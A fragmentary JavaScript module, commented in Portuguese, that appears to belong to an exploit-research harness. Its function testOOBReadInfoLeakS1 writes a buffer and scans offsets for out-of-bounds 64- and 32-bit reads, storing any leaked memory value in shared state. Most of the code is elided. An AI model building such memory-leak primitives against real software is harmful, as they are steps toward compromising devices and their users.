...
import { setLeakedValueS1, getLeakedValueS1 } from '../../state.mjs'; // Importa getter e setter

const SHORT_PAUSE_S1 = 50;

// Funções auxiliares (mantidas aqui por enquanto)
...
export async function testOOBReadInfoLeakS1() {
    ...
    // Se este teste for executado individualmente, ele deve definir seu próprio leak.
    // O reset global do leak deve ocorrer no "Run All S1".
    // setLeakedValueS1(null); // Resetar o leak específico se este teste for autônomo.
    ...
    let localLeakedValue = null; // Usar uma variável local para acumular antes de setar no estado global
    ...
    try {
        ...
        try {
            ...
            setLeakedValueS1(null); // Garantir que o estado global está nulo se a escrita falhar
            return false;
        }
        await PAUSE_FUNC(SHORT_PAUSE_S1);
        ...
        if (writeSuccess) {
            for (let readOffset = readRangeStart; readOffset < readRangeEnd; readOffset += 4) {
                ...
                if (localLeakedValue === null && readTargetAddress >= 0 && (readTargetAddress + 8) <= allocationSize) { // Priorizar U64
                    try {
                 ...
                 if (localLeakedValue === null && readTargetAddress >= 0 && (readTargetAddress + 4) <= allocationSize) { // Tentar U32 se U64 não encontrado
                     try {
                        ...
                        // Verifica se leu de volta o valor escrito, mesmo que não seja o leak principal
        ...
        setLeakedValueS1(localLeakedValue); // Definir o estado global com o que foi encontrado (ou null)
        const finalLeakedValue = getLeakedValueS1();
